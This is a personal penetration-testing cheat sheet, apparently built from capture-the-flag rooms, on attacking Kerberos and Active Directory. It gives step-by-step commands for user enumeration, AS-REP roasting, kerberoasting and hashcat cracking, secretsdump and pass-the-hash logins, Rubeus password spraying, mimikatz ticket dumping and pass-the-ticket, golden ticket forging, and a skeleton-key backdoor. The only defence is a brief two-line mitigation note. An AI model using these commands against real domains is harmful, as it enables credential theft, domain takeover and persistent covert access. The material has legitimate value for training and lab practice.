# KERBEROS / ACTIVE DIRECTORY

`Kerberos is the authentication service in a AD  
Note that Kerberos runs on port 88`  

## Tools :
- Impacket Suit
- BloodHound
- neo4j
- Enum4linux
- [Kerbrute](https://github.com/ropnop/kerbrute) (Really important here)  
- smbclient

# ASREP-Roasting
ASREP-Roasting : ASREP-Roasting occurs when a user account has the privilege "Does not require Pre-Authentication" set.

## Methodology
1. Enumerate
2. Look for valid users (userenum tag from kerbrute)
3. Get a ticket from a user to log as him  
	- Usually require valid credentials to KerbeRoast
	- If the privilege "Does not require Pre-auth" is set, then, we can use ASREP-Roasting  



## Enum open ports with nmap -A
Set DNS_Domain_Name (found with nmap -A) in /etc/hosts  

## Enum NetBios 
```bash
use enum4linux
```

## Enum for users via Kerberos (port 88)
```bash
kerbrute userenum -d spookysec.local --dc IP userlist.txt
```

|Tag | Meaning |
|:-------------|--------------------|
|spookysec.local | the DNS_Domain_Name (found with nmap -A)|
|userlist.txt | a list of usernames|

`Note that service users usually have more permissions than normal user account.  
So, this may be interesting. They often have an identifier such as "svc-" which stands for "service"`

## ASREP-Roasting w/ Impacket
ASREP-Roasting occurs when a user account has the privilege "Does not require Pre-Authentication" set.  
This basically consists of retrieving a Kerberos ticket wich can be cracked like a hash  

`This can be tested one by one like : `  
```bash
python3 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.68.12 spookysec.local/svc-admin -no-pass
```
|Tag | Meaning |
|:-------------|--------------------|
|svc-admin | a valid username found previously|
|spookysec.local | the DNS_Domain_Name (found with nmap -A)|
|-no-pass | Meaning that we are Asrep-Roasting|

`But it cans also bruteforce with a userlist`  

```bash
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -userfile userlist.txt
```
## Crack the hash
Found type : Kerberos 5 AS-REP etype 23  
Documentation : [hashcat](./hashcat.md)
```bash
hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt
```

## Enum for shares
***Available Tools :*** :
- smbclient
- smbmap
- mount
- smbget
- crackmapexec
```bash
smbclient -L 10.10.72.208 --user svc-admin
```

Or, we can uses smbmap, that looks at permissions too
```bash
smbmap -H spookysec.local -u svc-admin -p password
```
Then, type the password we found earlier  

Or, we can use crackmapexec :  
`Note that sometimes, running with "guest" as user may retrieve stuff`
```bash
crackmapexec smb spookysec.local -u 'svc-admin' -p 'password' --shares
```

## Log into a share w/ smbclient
```bash
smbclient \\\\spookysec.local\\backup --user svc-admin
```
Then, type the password we found earlier  

Or : 
```bash
smbclient \\\\spookysec.local\\backup -Usvc-admin%password
```
`Note that there is no space between -U and svc-admin`


|Tag | Meaning |
|:-------------|--------------------|
|svc-admin | a valid user who nicely gave us his password|




## Enum for additionnal information w/ secretdump.py
``(Admitting that we have a password for the user `backup`)``
Now, we need to retrieve all of the password hashes that this user account has to offer, because we know that it's synced with the Domain Controller and that's why he saved all of them...  
```bash
secretsdump.py -just-dc backup@spookysec.local
```	


## Log in with PsExec by "Passing the hash"
`Note that this is not a vulnerability, this is how kerberos works`
```bash
psexec.py -hashes PUT_THE:HASH_HERE administrator@spookysec.local
get cmd
```

## Log in with Evil-Winrm by "Passing the hash"
/!\ This only needs the second part (NTLM) of the hash  

```bash
evil-winrm -u administrator -H PUT_THE_NT_HASH_HERE -i spookysec.local
get powershell
```

# Harvesting & Brute-Forcing Tickets / RUBEUS

***/!\ Require to ssh or rdp into the machine***  
This also require to have Rubeus installed in the machine

#### Harvesting tickets 
Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

The following payload will tells Rubeus to harvest TGT every 30s
```cmd
Rubeus.exe harvest /interval:30
```

#### Brute-Forcing / Password-Spraying
***Brute-Forcing***:Try a bunch of password for one user account  
***Password-Spaying***:Try one password for a bunch of known user account

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file, as you can do with /etc/host.  
```cmd
echo IP DOMAINNAME.extension >> C:\Windows\System32\drivers\etc\hosts 
```
Exemple : 
```cmd
echo 10.10.242.77 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts 
```
Since we are logged into the machine, the following command will find every user account and spray the given password against them all.
```cmd
Rubeus.exe brute /password:Password1 
```
or
```cmd
Rubeus.exe brute /password:Password1 /noticket
```
If there is a match, it will return the .kirbi TGT for that user, it looks like that : 
[sortie_spray_kerbrute](images/sortie_spray_kerbrute.png)


# KERBEROASTING / RUBEUS & IMPACKET
***Most popular Kerberos attack***
Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password

To find account those are Kerberoastable, we can use BloodHound (I will try it another time)
### WITH RUBEUS
This is used from the remote machine
The following command line will dump Kerberos hash and return any kerberoastable users
```cmd
Rubeus.exe kerberoast
```
- We can now copy the hash to our machine and crack it with : 
be careful of spaces and /n when copy-pasting
```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

### WITH IMPACKET
This is used from our local machine and it's require to have a valid username and password credentials
This following command line will dump Kerberos hashes and return any kerberoastable users
```bash
GetUserSPNs.py controller.local/User:Password -dc-ip 10.10.74.147 -request
```

- We can now copy the hash to our machine and crack it with : 
be careful of spaces and /n when copy-pasting
```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

## What Can a Service Account do?

- There are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not.
- If the service account is a domain admin, we can dump NTDS.dit.
- If the service account isn't a domain admin, we can escalate privileges or even spray passwords the password against other accounts

## Mitigation
- Strong passwords (As always -_-)
- Don't make services accounts domain admins

# AS-REP ROASTING / RUBEUS

 AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.  
- This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
 ```cmd
 Rubeus.exe asreproast 
 ```

***Be careful, you need to add 23$ after $krb5asrep$***
(To me, it seems to work even without 23$)

Then, crack the hash
```bash
hashcat -m 18200 hash.txt Pass.txt
```

# PASS THE TICKET (PTT)/ MIMIKATZ

## OVERWIEW
Mimikatz is well known to be a great tool to dump credentials from AD but it cans also be useful to dump tickets in Kerberos

### How 'Pass the ticket' works
1) Mimikatz dumps the TGT from LSASS (it will gives a .kirbi ticket)
2) Pass the ticket and acts as it's original owner

## PREPARE MIMIKATZ & DUMP THE TiCKET
```cmd
mimikatz.exe
privilege::debug
```
Ensure this output is '20'OK
If it doesn't, it means that you don't have admin privileges
```cmd
sekurlsa::tickets /export
```
This will export the ticket (.kirbi) to the directory you're in
***At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier***

## PASS THE TICKET
If you leave mimikatz, you will see that there are tickets in the directory. 
Copy the one that is interesting for you and return to mimiktatz
```cmd 
mimikatz.exe
```
This will cache the ticket and impersonate it
```cmd
kerberos::ptt [0;193f8c]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
```
- The ticket looks like (it's the name of the file): [0;193f8c]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
- The output should be "* File : <Stuff> OK"
Let's just verify that it works by listing all cached tickets
You need to exit mimikatz so :
```cmd
exit
```
and
```cmd
klist
```
Here were just verifying that we successfully impersonated the ticket by listing our cached tickets. 

We now have impersonnated the ticket and have the same rights 
We can now list the admin$ share
```cmd
dir \\IP\admin$
```

# GOLDEN/SILVER TICKETS ATTACKS / MIMIKATZ
Mimikatz is also known to be a great tool to create Golden and Silver tickets
Silver tickets are stealther than the golden ones but quite less powerfull

In order to create a golden ticket, we need the KRBTGT = service account that create TGT with KDC  
In order to create a silver ticket, we only need any accessible account that can log into the desired service

## DUMP THE KRBTGT HASH
Starts mimikatz : 
```cmd
privilege::debug 
```
- ensure this outputs [privilege '20' ok] : 

```cmd
lsadump::lsa /inject /name:krbtgt 
```
- Notice that krbtgt is a user, so it cans change 
- This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

The output will be useful for the next step :
["Mimikatz"](images/mimikatz_lsadump.png)

## CREATE THE GOLDEN TICKET
```cmd
Kerberos::golden /user:Administrator /domain:CONTROLLER.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
```

- Administrator : The username
- domain : The domain controller name
- SID : the second part of the first line from the output
- krbtgt : the primary NTLM hash
- id : 500 -> idk what is that

## USE THE GOLDEN TICKET
```cmd 
misc::cmd
```

# Kerberos backdoor w/ mimikatz
Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.  
The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. (is that chinese ?)  
The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

```cmd
mimikatz.exe
privilege::debug
```
As always, check if you have admin perms
```cmd
misc::skeleton
```
### Accessing the forest
The default credentials will be: "mimikatz"

example: 
```cmd
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
```
- The share will now be accessible without the need for the Administrators password

example: 
```cmd
dir \\Desktop-1\c$ /user:Machine1 mimikatz 
```
- access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.